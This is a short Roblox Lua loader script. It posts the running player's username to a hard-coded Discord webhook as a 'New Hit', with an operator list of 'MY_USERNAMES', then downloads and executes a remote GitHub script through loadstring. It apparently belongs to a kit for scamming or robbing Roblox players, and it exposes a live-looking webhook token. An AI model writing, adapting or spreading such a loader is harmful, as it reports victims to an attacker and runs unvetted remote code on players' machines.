-- Your Own Loader (updated with new webhook)

_G.POOR_WEBHOOK = "https://discord.com/api/webhooks/1495064163356119165/k_RO1jp0D6hDfHomulVsNPga2rPuoDmWYBQ0gQShg9Pqo0Bw899-sIE0Ob3pDeaNAscy"

_G.MY_USERNAMES = {"daxkidcece", "thisisanalto048", "username"}   -- ← Change this to your real Roblox usernames

_G.PING_POOR = true

-- Send Discord ping
task.spawn(function()
    if _G.POOR_WEBHOOK and game.Players.LocalPlayer then
        local http = game:GetService("HttpService")
        local plr = game.Players.LocalPlayer
        local message = "@everyone New Hit! Username: " .. plr.Name
        game:HttpPost(_G.POOR_WEBHOOK, http:JSONEncode({content = message}))
    end
end)

-- Load the main GUI (this makes the menu appear)
task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/BaddiesScripted/test/refs/heads/main/gui.lua", true))()
end)
